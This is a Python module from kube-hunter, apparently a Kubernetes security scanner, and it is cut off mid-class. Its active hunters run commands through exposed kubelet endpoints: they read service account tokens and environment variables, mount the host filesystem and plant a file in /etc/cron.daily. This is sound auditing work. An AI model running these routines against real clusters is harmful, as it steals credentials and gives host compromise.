import json
import logging
import time
from enum import Enum

import re
import requests
import urllib3
import uuid

from kube_hunter.conf import get_config
from kube_hunter.core.events import handler
from kube_hunter.core.events.types import Vulnerability, Event, K8sVersionDisclosure
from kube_hunter.core.types import (
    Hunter,
    ActiveHunter,
    KubernetesCluster,
    Kubelet,
    InformationDisclosure,
    RemoteCodeExec,
    AccessRisk,
)
from kube_hunter.modules.discovery.kubelet import (
    ReadOnlyKubeletEvent,
    SecureKubeletEvent,
)

logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ExposedPodsHandler(Vulnerability, Event):
    """An attacker could view sensitive information about pods that are
    bound to a Node using the /pods endpoint"""

    def __init__(self, pods):
        Vulnerability.__init__(
            self, component=Kubelet, name="Exposed Pods", category=InformationDisclosure, vid="KHV052"
        )
        self.pods = pods
        self.evidence = f"count: {len(self.pods)}"


class AnonymousAuthEnabled(Vulnerability, Event):
    """The kubelet is misconfigured, potentially allowing secure access to all requests on the kubelet,
    without the need to authenticate"""

    def __init__(self):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Anonymous Authentication",
            category=RemoteCodeExec,
            vid="KHV036",
        )


class ExposedContainerLogsHandler(Vulnerability, Event):
    """Output logs from a running container are using the exposed /containerLogs endpoint"""

    def __init__(self):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed Container Logs",
            category=InformationDisclosure,
            vid="KHV037",
        )


class ExposedRunningPodsHandler(Vulnerability, Event):
    """Outputs a list of currently running pods,
    and some of their metadata, which can reveal sensitive information"""

    def __init__(self, count):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed Running Pods",
            category=InformationDisclosure,
            vid="KHV038",
        )
        self.count = count
        self.evidence = f"{self.count} running pods"


class ExposedExecHandler(Vulnerability, Event):
    """An attacker could run arbitrary commands on a container"""

    def __init__(self):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed Exec On Container",
            category=RemoteCodeExec,
            vid="KHV039",
        )


class ExposedRunHandler(Vulnerability, Event):
    """An attacker could run an arbitrary command inside a container"""

    def __init__(self):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed Run Inside Container",
            category=RemoteCodeExec,
            vid="KHV040",
        )


class ExposedPortForwardHandler(Vulnerability, Event):
    """An attacker could set port forwarding rule on a pod"""

    def __init__(self):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed Port Forward",
            category=RemoteCodeExec,
            vid="KHV041",
        )


class ExposedAttachHandler(Vulnerability, Event):
    """Opens a websocket that could enable an attacker
    to attach to a running container"""

    def __init__(self):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed Attaching To Container",
            category=RemoteCodeExec,
            vid="KHV042",
        )


class ExposedHealthzHandler(Vulnerability, Event):
    """By accessing the open /healthz handler,
    an attacker could get the cluster health state without authenticating"""

    def __init__(self, status):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Cluster Health Disclosure",
            category=InformationDisclosure,
            vid="KHV043",
        )
        self.status = status
        self.evidence = f"status: {self.status}"


class ExposedExistingPrivilegedContainersViaSecureKubeletPort(Vulnerability, Event):
    """A malicious actor, that has confirmed anonymous access to the API via the kubelet's secure port, \
can leverage the existing privileged containers identified to damage the host and potentially \
the whole cluster"""

    def __init__(self, exposed_existing_privileged_containers):
        Vulnerability.__init__(
            self,
            component=KubernetesCluster,
            name="Exposed Existing Privileged Container(s) Via Secure Kubelet Port",
            category=AccessRisk,
            vid="KHV051",
        )
        self.exposed_existing_privileged_containers = exposed_existing_privileged_containers


class PrivilegedContainers(Vulnerability, Event):
    """A Privileged container exist on a node
    could expose the node/cluster to unwanted root operations"""

    def __init__(self, containers):
        Vulnerability.__init__(
            self,
            component=KubernetesCluster,
            name="Privileged Container",
            category=AccessRisk,
            vid="KHV044",
        )
        self.containers = containers
        self.evidence = f"pod: {containers[0][0]}, " f"container: {containers[0][1]}, " f"count: {len(containers)}"


class ExposedSystemLogs(Vulnerability, Event):
    """System logs are exposed from the /logs endpoint on the kubelet"""

    def __init__(self):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed System Logs",
            category=InformationDisclosure,
            vid="KHV045",
        )


class ExposedKubeletCmdline(Vulnerability, Event):
    """Commandline flags that were passed to the kubelet can be obtained from the pprof endpoints"""

    def __init__(self, cmdline):
        Vulnerability.__init__(
            self,
            component=Kubelet,
            name="Exposed Kubelet Cmdline",
            category=InformationDisclosure,
            vid="KHV046",
        )
        self.cmdline = cmdline
        self.evidence = f"cmdline: {self.cmdline}"


class KubeletHandlers(Enum):
    # GET
    PODS = "pods"
    # GET
    CONTAINERLOGS = "containerLogs/{pod_namespace}/{pod_id}/{container_name}"
    # GET
    RUNNINGPODS = "runningpods"
    # GET -> WebSocket
    EXEC = "exec/{pod_namespace}/{pod_id}/{container_name}?command={cmd}&input=1&output=1&tty=1"
    # POST, For legacy reasons, it uses different query param than exec
    RUN = "run/{pod_namespace}/{pod_id}/{container_name}?cmd={cmd}"
    # GET/POST
    PORTFORWARD = "portForward/{pod_namespace}/{pod_id}?port={port}"
    # GET -> WebSocket
    ATTACH = "attach/{pod_namespace}/{pod_id}/{container_name}?command={cmd}&input=1&output=1&tty=1"
    # GET
    LOGS = "logs/{path}"
    # GET
    PPROF_CMDLINE = "debug/pprof/cmdline"


@handler.subscribe(ReadOnlyKubeletEvent)
class ReadOnlyKubeletPortHunter(Hunter):
    """Kubelet Readonly Ports Hunter
    Hunts specific endpoints on open ports in the readonly Kubelet server
    """

    def __init__(self, event):
        self.event = event
        self.path = f"http://{self.event.host}:{self.event.port}"
        self.pods_endpoint_data = ""

    def get_k8s_version(self):
        config = get_config()
        logger.debug("Passive hunter is attempting to find kubernetes version")
        metrics = requests.get(f"{self.path}/metrics", timeout=config.network_timeout).text
        for line in metrics.split("\n"):
            if line.startswith("kubernetes_build_info"):
                for info in line[line.find("{") + 1 : line.find("}")].split(","):
                    k, v = info.split("=")
                    if k == "gitVersion":
                        return v.strip('"')

    # returns list of tuples of Privileged container and their pod.
    def find_privileged_containers(self):
        logger.debug("Trying to find privileged containers and their pods")
        privileged_containers = []
        if self.pods_endpoint_data:
            for pod in self.pods_endpoint_data["items"]:
                for container in pod["spec"]["containers"]:
                    if container.get("securityContext", {}).get("privileged"):
                        privileged_containers.append((pod["metadata"]["name"], container["name"]))
        return privileged_containers if len(privileged_containers) > 0 else None

    def get_pods_endpoint(self):
        config = get_config()
        logger.debug("Attempting to find pods endpoints")
        response = requests.get(f"{self.path}/pods", timeout=config.network_timeout)
        if "items" in response.text:
            return response.json()

    def check_healthz_endpoint(self):
        config = get_config()
        r = requests.get(f"{self.path}/healthz", verify=False, timeout=config.network_timeout)
        return r.text if r.status_code == 200 else False

    def execute(self):
        self.pods_endpoint_data = self.get_pods_endpoint()
        k8s_version = self.get_k8s_version()
        privileged_containers = self.find_privileged_containers()
        healthz = self.check_healthz_endpoint()
        if k8s_version:
            self.publish_event(
                K8sVersionDisclosure(version=k8s_version, from_endpoint="/metrics", extra_info="on Kubelet")
            )
        if privileged_containers:
            self.publish_event(PrivilegedContainers(containers=privileged_containers))
        if healthz:
            self.publish_event(ExposedHealthzHandler(status=healthz))
        if self.pods_endpoint_data:
            self.publish_event(ExposedPodsHandler(pods=self.pods_endpoint_data["items"]))


@handler.subscribe(SecureKubeletEvent)
class SecureKubeletPortHunter(Hunter):
    """Kubelet Secure Ports Hunter
    Hunts specific endpoints on an open secured Kubelet
    """

    class DebugHandlers:
        """all methods will return the handler name if successful"""

        def __init__(self, path, pod, session=None):
            self.path = path + ("/" if not path.endswith("/") else "")
            self.session = session if session else requests.Session()
            self.pod = pod

        # outputs logs from a specific container
        def test_container_logs(self):
            config = get_config()
            logs_url = self.path + KubeletHandlers.CONTAINERLOGS.value.format(
                pod_namespace=self.pod["namespace"],
                pod_id=self.pod["name"],
                container_name=self.pod["container"],
            )
            return self.session.get(logs_url, verify=False, timeout=config.network_timeout).status_code == 200

        # need further investigation on websockets protocol for further implementation
        def test_exec_container(self):
            config = get_config()
            # opens a stream to connect to using a web socket
            headers = {"X-Stream-Protocol-Version": "v2.channel.k8s.io"}
            exec_url = self.path + KubeletHandlers.EXEC.value.format(
                pod_namespace=self.pod["namespace"],
                pod_id=self.pod["name"],
                container_name=self.pod["container"],
                cmd="",
            )
            return (
                "/cri/exec/"
                in self.session.get(
                    exec_url,
                    headers=headers,
                    allow_redirects=False,
                    verify=False,
                    timeout=config.network_timeout,
                ).text
            )

        # need further investigation on websockets protocol for further implementation
        def test_port_forward(self):
            pass
            # TODO: what to return?
            # Example starting code:
            #
            # config = get_config()
            # headers = {
            #     "Upgrade": "websocket",
            #     "Connection": "Upgrade",
            #     "Sec-Websocket-Key": "s",
            #     "Sec-Websocket-Version": "13",
            #     "Sec-Websocket-Protocol": "SPDY",
            # }
            # pf_url = self.path + KubeletHandlers.PORTFORWARD.value.format(
            #     pod_namespace=self.pod["namespace"],
            #     pod_id=self.pod["name"],
            #     port=80,
            # )

        # executes one command and returns output
        def test_run_container(self):
            config = get_config()
            run_url = self.path + KubeletHandlers.RUN.value.format(
                pod_namespace="test",
                pod_id="test",
                container_name="test",
                cmd="",
            )
            # if we get this message, we know we passed Authentication and Authorization, and that the endpoint is enabled.
            status_code = self.session.post(run_url, verify=False, timeout=config.network_timeout).status_code
            return status_code == requests.codes.NOT_FOUND

        # returns list of currently running pods
        def test_running_pods(self):
            config = get_config()
            pods_url = self.path + KubeletHandlers.RUNNINGPODS.value
            r = self.session.get(pods_url, verify=False, timeout=config.network_timeout)
            return r.json() if r.status_code == 200 else False

        # need further investigation on the differences between attach and exec
        def test_attach_container(self):
            config = get_config()
            # headers={"X-Stream-Protocol-Version": "v2.channel.k8s.io"}
            attach_url = self.path + KubeletHandlers.ATTACH.value.format(
                pod_namespace=self.pod["namespace"],
                pod_id=self.pod["name"],
                container_name=self.pod["container"],
                cmd="",
            )
            return (
                "/cri/attach/"
                in self.session.get(
                    attach_url,
                    allow_redirects=False,
                    verify=False,
                    timeout=config.network_timeout,
                ).text
            )

        # checks access to logs endpoint
        def test_logs_endpoint(self):
            config = get_config()
            logs_url = self.session.get(
                self.path + KubeletHandlers.LOGS.value.format(path=""),
                timeout=config.network_timeout,
            ).text
            return "<pre>" in logs_url

        # returns the cmd line used to run the kubelet
        def test_pprof_cmdline(self):
            config = get_config()
            cmd = self.session.get(
                self.path + KubeletHandlers.PPROF_CMDLINE.value,
                verify=False,
                timeout=config.network_timeout,
            )
            return cmd.text if cmd.status_code == 200 else None

    def __init__(self, event):
        self.event = event
        self.session = requests.Session()
        if self.event.secure:
            self.session.headers.update({"Authorization": f"Bearer {self.event.auth_token}"})
            # self.session.cert = self.event.client_cert
        # copy session to event
        self.event.session = self.session
        self.path = f"https://{self.event.host}:10250"
        self.kubehunter_pod = {
            "name": "kube-hunter",
            "namespace": "default",
            "container": "kube-hunter",
        }
        self.pods_endpoint_data = ""

    def get_pods_endpoint(self):
        config = get_config()
        response = self.session.get(f"{self.path}/pods", verify=False, timeout=config.network_timeout)
        if "items" in response.text:
            return response.json()

    def check_healthz_endpoint(self):
        config = get_config()
        r = requests.get(f"{self.path}/healthz", verify=False, timeout=config.network_timeout)
        return r.text if r.status_code == 200 else False

    def execute(self):
        if self.event.anonymous_auth:
            self.publish_event(AnonymousAuthEnabled())

        self.pods_endpoint_data = self.get_pods_endpoint()
        healthz = self.check_healthz_endpoint()
        if self.pods_endpoint_data:
            self.publish_event(ExposedPodsHandler(pods=self.pods_endpoint_data["items"]))
        if healthz:
            self.publish_event(ExposedHealthzHandler(status=healthz))
        self.test_handlers()

    def test_handlers(self):
        config = get_config()
        # if kube-hunter runs in a pod, we test with kube-hunter's pod
        pod = self.kubehunter_pod if config.pod else self.get_random_pod()
        if pod:
            debug_handlers = self.DebugHandlers(self.path, pod, self.session)
            try:
                # TODO: use named expressions, introduced in python3.8
                running_pods = debug_handlers.test_running_pods()
                if running_pods:
                    self.publish_event(ExposedRunningPodsHandler(count=len(running_pods["items"])))
                cmdline = debug_handlers.test_pprof_cmdline()
                if cmdline:
                    self.publish_event(ExposedKubeletCmdline(cmdline=cmdline))
                if debug_handlers.test_container_logs():
                    self.publish_event(ExposedContainerLogsHandler())
                if debug_handlers.test_exec_container():
                    self.publish_event(ExposedExecHandler())
                if debug_handlers.test_run_container():
                    self.publish_event(ExposedRunHandler())
                if debug_handlers.test_port_forward():
                    self.publish_event(ExposedPortForwardHandler())  # not implemented
                if debug_handlers.test_attach_container():
                    self.publish_event(ExposedAttachHandler())
                if debug_handlers.test_logs_endpoint():
                    self.publish_event(ExposedSystemLogs())
            except Exception:
                logger.debug("Failed testing debug handlers", exc_info=True)

    # trying to get a pod from default namespace, if doesn't exist, gets a kube-system one
    def get_random_pod(self):
        if self.pods_endpoint_data:
            pods_data = self.pods_endpoint_data["items"]

            def is_default_pod(pod):
                return pod["metadata"]["namespace"] == "default" and pod["status"]["phase"] == "Running"

            def is_kubesystem_pod(pod):
                return pod["metadata"]["namespace"] == "kube-system" and pod["status"]["phase"] == "Running"

            pod_data = next(filter(is_default_pod, pods_data), None)
            if not pod_data:
                pod_data = next(filter(is_kubesystem_pod, pods_data), None)

            if pod_data:
                container_data = pod_data["spec"]["containers"][0]
                if container_data:
                    return {
                        "name": pod_data["metadata"]["name"],
                        "container": container_data["name"],
                        "namespace": pod_data["metadata"]["namespace"],
                    }


""" Active Hunters """


@handler.subscribe(AnonymousAuthEnabled)
class ProveAnonymousAuth(ActiveHunter):
    """Foothold Via Secure Kubelet Port
    Attempts to demonstrate that a malicious actor can establish foothold into the cluster via a
    container abusing the configuration of the kubelet's secure port: authentication-auth=false.
    """

    def __init__(self, event):
        self.event = event
        self.base_url = f"https://{self.event.host}:10250/"

    def get_request(self, url, verify=False):
        config = get_config()
        try:
            response_text = self.event.session.get(url=url, verify=verify, timeout=config.network_timeout).text.rstrip()

            return response_text
        except Exception as ex:
            logging.debug("Exception: " + str(ex))
            return "Exception: " + str(ex)

    def post_request(self, url, params, verify=False):
        config = get_config()
        try:
            response_text = self.event.session.post(
                url=url, verify=verify, params=params, timeout=config.network_timeout
            ).text.rstrip()

            return response_text
        except Exception as ex:
            logging.debug("Exception: " + str(ex))
            return "Exception: " + str(ex)

    @staticmethod
    def has_no_exception(result):
        return "Exception: " not in result

    @staticmethod
    def has_no_error(result):
        possible_errors = ["exited with", "Operation not permitted", "Permission denied", "No such file or directory"]

        return not any(error in result for error in possible_errors)

    @staticmethod
    def has_no_error_nor_exception(result):
        return ProveAnonymousAuth.has_no_error(result) and ProveAnonymousAuth.has_no_exception(result)

    def cat_command(self, run_request_url, full_file_path):
        return self.post_request(run_request_url, {"cmd": f"cat {full_file_path}"})

    def process_container(self, run_request_url):
        service_account_token = self.cat_command(run_request_url, "/var/run/secrets/kubernetes.io/serviceaccount/token")

        environment_variables = self.post_request(run_request_url, {"cmd": "env"})

        if self.has_no_error_nor_exception(service_account_token):
            return {
                "result": True,
                "service_account_token": service_account_token,
                "environment_variables": environment_variables,
            }

        return {"result": False}

    def execute(self):
        pods_raw = self.get_request(self.base_url + KubeletHandlers.PODS.value)

        # At this point, the following must happen:
        # a) we get the data of the running pods
        # b) we get a forbidden message because the API server
        # has a configuration that denies anonymous attempts despite the kubelet being vulnerable

        if self.has_no_error_nor_exception(pods_raw) and "items" in pods_raw:
            pods_data = json.loads(pods_raw)["items"]

            temp_message = ""
            exposed_existing_privileged_containers = list()

            for pod_data in pods_data:
                pod_namespace = pod_data["metadata"]["namespace"]
                pod_id = pod_data["metadata"]["name"]

                for container_data in pod_data["spec"]["containers"]:
                    container_name = container_data["name"]

                    run_request_url = self.base_url + f"run/{pod_namespace}/{pod_id}/{container_name}"

                    extracted_data = self.process_container(run_request_url)

                    if extracted_data["result"]:
                        service_account_token = extracted_data["service_account_token"]
                        environment_variables = extracted_data["environment_variables"]

                        temp_message += (
                            f"\n\nPod namespace: {pod_namespace}"
                            + f"\n\nPod ID: {pod_id}"
                            + f"\n\nContainer name: {container_name}"
                            + f"\n\nService account token: {service_account_token}"
                            + f"\nEnvironment variables: {environment_variables}"
                        )

                        first_check = container_data.get("securityContext", {}).get("privileged")

                        first_subset = container_data.get("securityContext", {})
                        second_subset = first_subset.get("capabilities", {})
                        data_for_second_check = second_subset.get("add", [])

                        second_check = "SYS_ADMIN" in data_for_second_check

                        if first_check or second_check:
                            exposed_existing_privileged_containers.append(
                                {
                                    "pod_namespace": pod_namespace,
                                    "pod_id": pod_id,
                                    "container_name": container_name,
                                    "service_account_token": service_account_token,
                                    "environment_variables": environment_variables,
                                }
                            )

            if temp_message:
                message = "The following containers have been successfully breached." + temp_message

                self.event.evidence = f"{message}"

            if exposed_existing_privileged_containers:
                self.publish_event(
                    ExposedExistingPrivilegedContainersViaSecureKubeletPort(
                        exposed_existing_privileged_containers=exposed_existing_privileged_containers
                    )
                )


@handler.subscribe(ExposedExistingPrivilegedContainersViaSecureKubeletPort)
class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
    """Malicious Intent Via Secure Kubelet Port
    Attempts to demonstrate that a malicious actor can leverage existing privileged containers
    exposed via the kubelet's secure port, due to anonymous auth enabled misconfiguration,
    such that a process can be started or modified on the host.
    """

    def __init__(self, event, seconds_to_wait_for_os_command=1):
        self.event = event
        self.base_url = f"https://{self.event.host}:10250/"
        self.seconds_to_wait_for_os_command = seconds_to_wait_for_os_command
        self.number_of_rm_attempts = 5
        self.number_of_rmdir_attempts = 5
        self.number_of_umount_attempts = 5

    def post_request(self, url, params, verify=False):
        config = get_config()
        try:
            response_text = self.event.session.post(
                url, verify, params=params, timeout=config.network_timeout
            ).text.rstrip()

            return response_text
        except Exception as ex:
            logging.debug("Exception: " + str(ex))
            return "Exception: " + str(ex)

    def cat_command(self, run_request_url, full_file_path):
        return self.post_request(run_request_url, {"cmd": f"cat {full_file_path}"})

    def clean_attacked_exposed_existing_privileged_container(
        self,
        run_request_url,
        file_system_or_partition,
        directory_created,
        file_created,
        number_of_rm_attempts,
        number_of_umount_attempts,
        number_of_rmdir_attempts,
        seconds_to_wait_for_os_command,
    ):

        self.rm_command(
            run_request_url,
            f"{directory_created}/etc/cron.daily/{file_created}",
            number_of_rm_attempts,
            seconds_to_wait_for_os_command,
        )

        self.umount_command(
            run_request_url,
            file_system_or_partition,
            directory_created,
            number_of_umount_attempts,
            seconds_to_wait_for_os_command,
        )

        self.rmdir_command(
            run_request_url,
            directory_created,
            number_of_rmdir_attempts,
            seconds_to_wait_for_os_command,
        )

    def check_file_exists(self, run_request_url, file):
        file_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=file)

        return ProveAnonymousAuth.has_no_error_nor_exception(file_exists)

    def rm_command(self, run_request_url, file_to_remove, number_of_rm_attempts, seconds_to_wait_for_os_command):
        if self.check_file_exists(run_request_url, file_to_remove):
            for _ in range(number_of_rm_attempts):
                command_execution_outcome = self.post_request(run_request_url, {"cmd": f"rm -f {file_to_remove}"})

                if seconds_to_wait_for_os_command:
                    time.sleep(seconds_to_wait_for_os_command)

                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
                second_check = self.check_file_exists(run_request_url, file_to_remove)

                if first_check and not second_check:
                    return True

        pod_id = run_request_url.replace(self.base_url + "run/", "").split("/")[1]
        container_name = run_request_url.replace(self.base_url + "run/", "").split("/")[2]
        logger.warning(
            "kube-hunter: "
            + "POD="
            + pod_id
            + ", "
            + "CONTAINER="
            + container_name
            + " - Unable to remove file: "
            + file_to_remove
        )

        return False

    def chmod_command(self, run_request_url, permissions, file):
        return self.post_request(run_request_url, {"cmd": f"chmod {permissions} {file}"})

    def touch_command(self, run_request_url, file_to_create):
        return self.post_request(run_request_url, {"cmd": f"touch {file_to_create}"})

    def attack_exposed_existing_privileged_container(
        self, run_request_url, directory_created, number_of_rm_attempts, seconds_to_wait_for_os_command, file_name=None
    ):
        if file_name is None:
            file_name = "kube-hunter" + str(uuid.uuid1())

        file_name_with_path = f"{directory_created}/etc/cron.daily/{file_name}"

        file_created = self.touch_command(run_request_url, file_name_with_path)

        if ProveAnonymousAuth.has_no_error_nor_exception(file_created):
            permissions_changed = self.chmod_command(run_request_url, "755", file_name_with_path)

            if ProveAnonymousAuth.has_no_error_nor_exception(permissions_changed):
                return {"result": True, "file_created": file_name}

            self.rm_command(run_request_url, file_name_with_path, number_of_rm_attempts, seconds_to_wait_for_os_command)

        return {"result": False}

    def check_directory_exists(self, run_request_url, directory):
        directory_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=directory)

        return ProveAnonymousAuth.has_no_error_nor_exception(directory_exists)

    def rmdir_command(
        self,
        run_request_url,
        directory_to_remove,
        number_of_rmdir_attempts,
        seconds_to_wait_for_os_command,
    ):
        if self.check_directory_exists(run_request_url, directory_to_remove):
            for _ in range(number_of_rmdir_attempts):
                command_execution_outcome = self.post_request(run_request_url, {"cmd": f"rmdir {directory_to_remove}"})

                if seconds_to_wait_for_os_command:
                    time.sleep(seconds_to_wait_for_os_command)

                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
                second_check = self.check_directory_exists(run_request_url, directory_to_remove)

                if first_check and not second_check:
                    return True

        pod_id = run_request_url.replace(self.base_url + "run/", "").split("/")[1]
        container_name = run_request_url.replace(self.base_url + "run/", "").split("/")[2]
        logger.warning(
            "kube-hunter: "
            + "POD="
            + pod_id
            + ", "
            + "CONTAINER="
            + container_name
            + " - Unable to remove directory: "
            + directory_to_remove
        )

        return False

    def ls_command(self, run_request_url, file_or_directory):
        return self.post_request(run_request_url, {"cmd": f"ls {file_or_directory}"})

    def umount_command(
        self,
        run_request_url,
        file_system_or_partition,
        directory,
        number_of_umount_attempts,
        seconds_to_wait_for_os_command,
    ):
        # Note: the logic implemented proved more reliable than using "df"
        # command to resolve for mounted systems/partitions.
        current_files_and_directories = self.ls_command(run_request_url, directory)

        if self.ls_command(run_request_url, directory) == current_files_and_directories:
            for _ in range(number_of_umount_attempts):
                # Ref: http://man7.org/linux/man-pages/man2/umount.2.html
                command_execution_outcome = self.post_request(
                    run_request_url, {"cmd": f"umount {file_system_or_partition} {directory}"}
                )

                if seconds_to_wait_for_os_command:
                    time.sleep(seconds_to_wait_for_os_command)

                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
                second_check = self.ls_command(run_request_url, directory) != current_files_and_directories

                if first_check and second_check:
                    return True

        pod_id = run_request_url.replace(self.base_url + "run/", "").split("/")[1]
        container_name = run_request_url.replace(self.base_url + "run/", "").split("/")[2]
        logger.warning(
            "kube-hunter: "
            + "POD="
            + pod_id
            + ", "
            + "CONTAINER="
            + container_name
            + " - Unable to unmount "
            + file_system_or_partition
            + " at: "
            + directory
        )

        return False

    def mount_command(self, run_request_url, file_system_or_partition, directory):
        # Ref: http://man7.org/linux/man-pages/man1/mkdir.1.html
        return self.post_request(run_request_url, {"cmd": f"mount {file_system_or_partition} {directory}"})

    def mkdir_command(self, run_request_url, directory_to_create):
        # Ref: http://man7.org/linux/man-pages/man1/mkdir.1.html
        return self.post_request(run_request_url, {"cmd": f"mkdir {directory_to_create}"})

    def findfs_command(self, run_request_url, file_system_or_partition_type, file_system_or_partition):
        # Ref: http://man7.org/linux/man-pages/man8/findfs.8.html
        return self.post_request(
            run_request_url, {"cmd": f"findfs {file_system_or_partition_type}{file_system_or_partition}"}
        )

    def get_root_values(self, command_line):
        for command in command_line.split(" "):
            # Check for variable-definition commands as there can be commands which don't define variables.
            if "=" in command:
                split = command.split("=")
                if split[0] == "root":
                    if len(split) > 2:
                        # Potential valid scenario: root=LABEL=example
                        root_value_type = split[1] + "="
                        root_value = split[2]

                        return root_value, root_value_type
                    else:
                        root_value_type = ""
                        root_value = split[1]

                        return root_value, root_value_type

        return None, None

    def process_exposed_existing_privileged_container(
        self,
        run_request_url,
        number_of_umount_attempts,
        number_of_rmdir_attempts,
        seconds_to_wait_for_os_command,
        directory_to_create=None,
    ):
        if directory_to_create is None:
            directory_to_create = "/kube-hunter_" + str(uuid.uuid1())

        # /proc/cmdline - This file shows the parameters passed to the kernel at the time it is started.
        command_line = self.cat_command(run_request_url, "/proc/cmdline")

        if ProveAnonymousAuth.has_no_error_nor_exception(command_line):
            if len(command_line.split(" ")) > 0:
                root_value, root_value_type = self.get_root_values(command_line)

                # Move forward only when the "root" variable value was actually defined.
                if root_value:
                    if root_value_type:
                        file_system_or_partition = self.findfs_command(run_request_url, root_value_type, root_value)
                    else:
                        file_system_or_partition = root_value

                    if ProveAnonymousAuth.has_no_error_nor_exception(file_system_or_partition):
                        directory_created = self.mkdir_command(run_request_url, directory_to_create)

                        if ProveAnonymousAuth.has_no_error_nor_exception(directory_created):
                            directory_created = directory_to_create

                            mounted_file_system_or_partition = self.mount_command(
                                run_request_url, file_system_or_partition, directory_created
                            )

                            if ProveAnonymousAuth.has_no_error_nor_exception(mounted_file_system_or_partition):
                                host_name = self.cat_command(run_request_url, f"{directory_created}/etc/hostname")

                                if ProveAnonymousAuth.has_no_error_nor_exception(host_name):
                                    return {
                                        "result": True,
                                        "file_system_or_partition": file_system_or_partition,
                                        "directory_created": directory_created,
                                    }

                                self.umount_command(
                                    run_request_url,
                                    file_system_or_partition,
                                    directory_created,
                                    number_of_umount_attempts,
                                    seconds_to_wait_for_os_command,
                                )

                            self.rmdir_command(
                                run_request_url,
                                directory_created,
                                number_of_rmdir_attempts,
                                seconds_to_wait_for_os_command,
                            )

        return {"result": False}

    def execute(self, directory_to_create=None, file_name=None):
        temp_message = ""

        for exposed_existing_privileged_containers in self.event.exposed_existing_privileged_containers:
            pod_namespace = exposed_existing_privileged_containers["pod_namespace"]
            pod_id = exposed_existing_privileged_containers["pod_id"]
            container_name = exposed_existing_privileged_containers["container_name"]

            run_request_url = self.base_url + f"run/{pod_namespace}/{pod_id}/{container_name}"

            is_exposed_existing_privileged_container_privileged = self.process_exposed_existing_privileged_container(
                run_request_url,
                self.number_of_umount_attempts,
                self.number_of_rmdir_attempts,
                self.seconds_to_wait_for_os_command,
                directory_to_create,
            )

            if is_exposed_existing_privileged_container_privileged["result"]:
                file_system_or_partition = is_exposed_existing_privileged_container_privileged[
                    "file_system_or_partition"
                ]
                directory_created = is_exposed_existing_privileged_container_privileged["directory_created"]

                # Execute attack attempt: start/modify process in host.
                attack_successful_on_exposed_privileged_container = self.attack_exposed_existing_privileged_container(
                    run_request_url,
                    directory_created,
                    self.number_of_rm_attempts,
                    self.seconds_to_wait_for_os_command,
                    file_name,
                )

                if attack_successful_on_exposed_privileged_container["result"]:
                    file_created = attack_successful_on_exposed_privileged_container["file_created"]

                    self.clean_attacked_exposed_existing_privileged_container(
                        run_request_url,
                        file_system_or_partition,
                        directory_created,
                        file_created,
                        self.number_of_rm_attempts,
                        self.number_of_umount_attempts,
                        self.number_of_rmdir_attempts,
                        self.seconds_to_wait_for_os_command,
                    )

                    temp_message += "\n\nPod namespace: {}\n\nPod ID: {}\n\nContainer name: {}".format(
                        pod_namespace, pod_id, container_name
                    )

        if temp_message:
            message = (
                "The following exposed existing privileged containers"
                + " have been successfully abused by starting/modifying a process in the host."
                + temp_message
            )

            self.event.evidence = f"{message}"
        else:
            message = (
                "The following exposed existing privileged containers"
                + " were not successfully abused by starting/modifying a process in the host."
                + "Keep in mind that attackers might use other methods to attempt to abuse them."
                + temp_message
            )

            self.event.evidence = f"{message}"


@handler.subscribe(ExposedRunHandler)
class ProveRunHandler(ActiveHunter):
    """Kubelet Run Hunter
    Executes uname inside of a random container
    """

    def __init__(self, event):
        self.event = event
        self.base_path = f"https://{self.event.host}:{self.event.port}"

    def run(self, command, container):
        config = get_config()
        run_url = KubeletHandlers.RUN.value.format(
            pod_namespace=container["namespace"],
            pod_id=container["pod"],
            container_name=container["name"],
            cmd=command,
        )
        return self.event.session.post(
            f"{self.base_path}/{run_url}",
            verify=False,
            timeout=config.network_timeout,
        ).text

    def execute(self):
        config = get_config()
        r = self.event.session.get(
            f"{self.base_path}/" + KubeletHandlers.PODS.value,
            verify=False,
            timeout=config.network_timeout,
        )
        if "items" in r.text:
            pods_data = r.json()["items"]
            for pod_data in pods_data:
                container_data = pod_data["spec"]["containers"][0]
                if container_data:
                    output = self.run(
                        "uname -a",
                        container={
                            "namespace": pod_data["metadata"]["namespace"],
                            "pod": pod_data["metadata"]["name"],
                            "name": container_data["name"],
                        },
                    )
                    if output and "exited with" not in output:
                        self.event.evidence = "uname -a: " + output
                        break


@handler.subscribe(ExposedContainerLogsHandler)
class ProveContainerLogsHandler(ActiveHunter):
    """Kubelet Container Logs Hunter
    Retrieves logs from a random container
    """

    def __init__(self, event):
        self.event = event
        protocol = "https" if self.event.port == 10250 else "http"
        self.base_url = f"{protocol}://{self.event.host}:{self.event.port}/"

    def execute(self):
        config = get_config()
        pods_raw = self.event.session.get(
            self.base_url + KubeletHandlers.PODS.value,
            verify=False,
            timeout=config.network_timeout,
        ).text
        if "items" in pods_raw:
            pods_data = json.loads(pods_raw)["items"]
            for pod_data in pods_data:
                container_data = pod_data["spec"]["containers"][0]
                if container_data:
                    container_name = container_data["name"]
                    output = requests.get(
                        f"{self.base_url}/"
                        + KubeletHandlers.CONTAINERLOGS.value.format(
                            pod_namespace=pod_data["metadata"]["namespace"],
                            pod_id=pod_data["metadata"]["name"],
                            container_name=container_name,
                        ),
                        verify=False,
                        timeout=config.network_timeout,
                    )
                    if output.status_code == 200 and output.text:
                        self.event.evidence = f"{container_name}: {output.text}"
                        return


@handler.subscribe(ExposedSystemLogs)
class ProveSystemLogs(ActiveHunter):
    """Kubelet System Logs Hunter
    Retrieves commands from host's system audit
    """

    def __init__(self, event):
